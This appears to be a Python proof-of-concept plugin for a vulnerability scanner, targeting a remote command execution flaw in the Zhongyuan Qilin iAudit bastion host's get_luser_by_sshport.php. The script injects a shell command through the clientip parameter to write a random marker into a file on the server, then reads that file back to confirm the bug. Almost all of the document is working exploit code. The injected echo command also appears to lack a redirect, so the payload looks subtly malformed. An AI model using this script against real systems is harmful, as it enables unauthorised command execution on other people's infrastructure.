#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '中远麒麟 iAudit堡垒机 get_luser_by_sshport.php 远程命令执行',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  r1 = randomLowercase(20)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = f'/get_luser_by_sshport.php?clientip=1;echo+{r1}/opt/freesvr/web/htdocs/freesvr/audit/test.txt;&clientport=1'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'Warning.*?mysql_fetch_array.*?expects.*?parameter.*?boolean.*?',res.text,re.S):
      resp=requests.get(url+'/test.txt',headers=headers,timeout=5,verify=False)
      if r1 in resp.text:
        # ret['huixian'] = res.text
        res.close()
        ret['ifbug'] = True
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret